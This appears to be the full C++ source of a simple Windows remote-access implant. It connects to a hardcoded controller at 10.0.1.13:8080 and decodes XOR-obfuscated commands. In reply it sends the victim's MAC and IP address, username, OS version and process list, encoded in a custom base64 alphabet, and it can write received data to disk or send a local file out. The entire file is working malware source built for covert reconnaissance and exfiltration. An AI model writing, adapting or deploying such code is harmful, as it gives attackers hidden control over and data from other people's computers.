// Project.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <VersionHelpers.h>
#include <psapi.h>
#include <time.h>
#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib,"ws2_32.lib") //Winsock Library
#pragma warning(disable : 4996)

static const unsigned char custom_table[65] =
"uLoqK3h57MieJNUPzmdG1A9DCZBtjwlOVWaYTcx2pI/g0rb+4SfE6nFRHvyXkQs8";

#define INFO_BUFFER_SIZE 32767

//Encodes with base64
char* base64_encode(const unsigned char *src, size_t len){
	unsigned char *out, *pos;
	const unsigned char *end, *in;

	char outStr[INFO_BUFFER_SIZE] = {0};

	out = (unsigned char*)&outStr[0];

	end = src + len;
	in = src;
	pos = out;
	while (end - in >= 3) {
		*pos++ = custom_table[in[0] >> 2];
		*pos++ = custom_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
		*pos++ = custom_table[((in[1] & 0x0f) << 2) | (in[2] >> 6)];
		*pos++ = custom_table[in[2] & 0x3f];
		in += 3;
	}

	if (end - in) {
		*pos++ = custom_table[in[0] >> 2];
		if (end - in == 1) {
			*pos++ = custom_table[(in[0] & 0x03) << 4];
			*pos++ = '=';
		}
		else {
			*pos++ = custom_table[((in[0] & 0x03) << 4) |
				(in[1] >> 4)];
			*pos++ = custom_table[(in[1] & 0x0f) << 2];
		}
		*pos++ = '=';
	}
	return outStr;
}

//Gets the Name of a Process from the ID
char* GetProcessName(DWORD processID){
	TCHAR szProcessName[INFO_BUFFER_SIZE] = TEXT("Unknown Process Name");;

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID);

	if (NULL != hProcess){
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)){
			GetModuleBaseName(hProcess, hMod, szProcessName,
				sizeof(szProcessName) / sizeof(TCHAR));
		}
	}

	CloseHandle(hProcess);

	char* ProcessName = (char*)malloc(INFO_BUFFER_SIZE);
	wcstombs(ProcessName, szProcessName, wcslen(szProcessName) + 1);
	return ProcessName;
}

// Gets IP if arg is True
// Get MAC if arg is False
char* getIpOrMac(bool ip) {
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(AdapterInfo);
	char *mac_addr = (char*)malloc(17);

	AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (AdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");

	}

	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {

		AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
		if (AdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
		}
	}

	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo; // Contains pointer to current adapter info

		sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
			pAdapterInfo->Address[0], pAdapterInfo->Address[1],
			pAdapterInfo->Address[2], pAdapterInfo->Address[3],
			pAdapterInfo->Address[4], pAdapterInfo->Address[5]);

		if (ip) {
			char* ipaddr = pAdapterInfo->IpAddressList.IpAddress.String;
			return ipaddr;
		}
		else {
			free(AdapterInfo);
			return mac_addr;
		}
		free(AdapterInfo);
	}
	free(AdapterInfo);
}

//Gets the Operating System
const char* getOperatingSystem() {

	if (IsWindows10OrGreater()){
		return "Windows 10 Or Greater\0";
	}

	if (IsWindows8Point1OrGreater()){
		return "Windows 8.1O or Greater\0";
	}

	if (IsWindows8OrGreater()){
		return "Windows 8 Or Greater\0";
	}

	if (IsWindows7OrGreater()) {
		return "Windows 7 Or Greater\0";
	}

	if (IsWindowsVistaOrGreater()) {
		return "Vista Or Greater\0";
	}

	if (IsWindowsXPOrGreater()) {
		return "XP Or Greater\0";
	}
	else {
		return "Unknown Version\0";
	}
}

char* recv_data(SOCKET s) {
	char command[INFO_BUFFER_SIZE];
	int recv_size;

	if ((recv_size = recv(s, command, 4096, 0)) == SOCKET_ERROR)
	{
		printf("recv failed");
	}

	command[recv_size] = '\0';

	int i;
	for (i = 0; i < strlen(command); i++) {
		command[i] ^= 0x88;
	}
	return command;
}

int __cdecl main(){

	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return 1;
	}

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
	}

	server.sin_addr.s_addr = inet_addr("10.0.1.13");
	server.sin_family = AF_INET;
	server.sin_port = htons(8080);

	//Connect to remote server
	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		printf("connect error");
		return 1;
	}

	while (1) {

		char* command = recv_data(s);

		if (!strcmp(command, "MAC ADDRESS")) {
			char* mac = getIpOrMac(false);
			char* base64_mac = base64_encode((const unsigned char*)mac, strlen(mac));
			send(s, base64_mac, strlen(base64_mac), 0);
		}
		else if (!strcmp(command, "IP ADDRESS")) {
			char* ip = getIpOrMac(true);
			char* base64_ip = base64_encode((const unsigned char*)ip, strlen(ip));
			send(s, base64_ip, strlen(base64_ip), 0);
		}
		else if (!strcmp(command, "USERNAME")) {
			TCHAR  infoBuf[INFO_BUFFER_SIZE];
			DWORD  bufCharCount = INFO_BUFFER_SIZE;

			if (!GetUserName(infoBuf, &bufCharCount)) {
				printf("Error with GetUserName");
			}

			char username[INFO_BUFFER_SIZE];

			//convert TCHAR to char*
			wcstombs(username, infoBuf, wcslen(infoBuf) + 1);

			char* base64_username = base64_encode((const unsigned char*)username, strlen(username));
			send(s, base64_username, strlen(base64_username), 0);
		}
		else if (!strcmp(command, "OS")) {
			const char* operatingSys = getOperatingSystem();
			char* base64_operatingSys = base64_encode((const unsigned char*)operatingSys, strlen(operatingSys));
			send(s, base64_operatingSys, strlen(base64_operatingSys), 0);
		}
		else if (!strcmp(command, "PROCESSES")) {
			DWORD aProcesses[1024], cbNeeded, cProcesses;
			unsigned int x;

			if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
				return 1;
			}

			cProcesses = cbNeeded / sizeof(DWORD);

			char ProcString[INFO_BUFFER_SIZE] = { 0 };

			for (x = 0; x < cProcesses; x++) {
				if (aProcesses[x] != 0) {
					char* ProcName = GetProcessName(aProcesses[x]);
					char wholeString[100];
					sprintf(wholeString, "PID: %d, Name: %s\n", aProcesses[x], ProcName);
					strcat(ProcString, wholeString);
					free(ProcName);
				}
			}
			char* base64_ProcName = base64_encode((const unsigned char*)ProcString, strlen(ProcString));
			send(s, base64_ProcName, strlen(base64_ProcName), 0);
		}
		else if (!strcmp(command, "UPLOAD")) {

			char filename[9];
			srand(time(NULL));
			int r = rand() % 10000;

			sprintf(filename, "%d.txt\0", r);
			char* file_data = recv_data(s);

			//strcpy(filename1, filename);

			FILE *fp;
			fp = fopen( filename, "wb");
			if (fp == NULL)
				perror("ERROR");
			fwrite(file_data, strlen(file_data), 1, fp);
			fclose(fp);
		}
		else if (!strcmp(command, "DOWNLOAD")) {
			FILE *fp;
			long lSize;
			char * filedata;
			size_t result;

			fp = fopen("download.txt", "rb");
			fseek(fp, 0, SEEK_END);
			lSize = ftell(fp);
			rewind(fp);
			filedata = (char*)malloc(lSize + 1);
			fread(filedata, lSize, 1, fp);
			fclose(fp);
			filedata[lSize] = '\0';

			char* base64_filedata = base64_encode((const unsigned char*)filedata, strlen(filedata));
			send(s, base64_filedata, strlen(base64_filedata), 0);
			free(filedata);
		}else {
			closesocket(s);
			WSACleanup();
			break;
		}
	}
	return 1;
}
